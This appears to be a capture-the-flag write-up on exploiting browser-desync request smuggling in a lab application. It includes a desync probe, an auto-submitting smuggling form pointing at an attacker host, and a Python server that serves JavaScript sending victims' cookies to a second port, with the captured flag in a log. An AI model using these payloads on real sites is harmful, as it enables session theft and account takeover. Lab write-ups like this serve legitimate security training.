**Overview:**
	![](Pasted%20image%2020250216051852.png)

First step is to see if the application if vulnerable of browser desync and we will use the following payload:
```javascript
fetch('http://challenge.thm/', {

    method: 'POST',

    body: 'GET /redirect HTTP/1.1\r\nFoo: x',

    mode: 'cors',

})
```

 Utilizing the given payload and refreshing the page results in a **404 error** page. This indicates that the web server is vulnerable to request smuggling browser desync.

Next, we can observe that the contact page does not correctly sanitize text input, potentially allowing us to send an arbitrary payload.
	![](Pasted%20image%2020250216052123.png)

Visting  [http://challenge.thm/securecontact](http://challenge.thm/securecontact) we can notice that the input from the message field is reflected but is not interpreted:
	![](Pasted%20image%2020250216052243.png)

The victim will instead visit another page [http://challenge.thm/vulnerablecontact](http://challenge.thm/vulnerablecontact) where the input will be interpreted.
	![](Pasted%20image%2020250216052319.png)

Now, we just need to build our payload to redirect the victim user to fetch the second payload **from our server**:

```html
<form id="btn" action="http://challenge.thm/"
    method="POST"
    enctype="text/plain">
<textarea name="GET http://10.10.201.241:1337 HTTP/1.1
AAA: A">placeholder1</textarea>
<button type="submit">placeholder2</button>
</form>
<script> btn.submit() </script>

```

Finally, we will serve a payload on our controlled server to steal the user's cookie and send it to us:

```python
#!/usr/bin/python3

from http.server import BaseHTTPRequestHandler, HTTPServer

class ExploitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-type","text/html")

            self.end_headers()
            self.wfile.write(b"fetch('http://{10.10.201.241}:8080/' + document.cookie)")
def run_server(port=1337):   
    server_address = ('', port)
    httpd = HTTPServer(server_address, ExploitHandler)
    print(f"Server running on port {port}")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
```

```shell
sudo python3 server.py
```

Note that the victim will make an additional request to port 8080; we can serve another Python web service by using:

```python
sudo python3 -m http.server 8080
```

```shell
sudo python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/)
- - - - "GET /flag=THM{REDACTED} HTTP/1.1" 404 -w
```


- payload is delivered by an XSS which will create a form where on click our victim will be redirected to our malicious server(served on port 1337) where a python script is present for cookie stealing.
	![](Pasted%20image%2020250216054405.png)
		![](Pasted%20image%2020250216054522.png)

- the python script is configured to exfiltrate cookies on port 8080
	![](Pasted%20image%2020250216054414.png)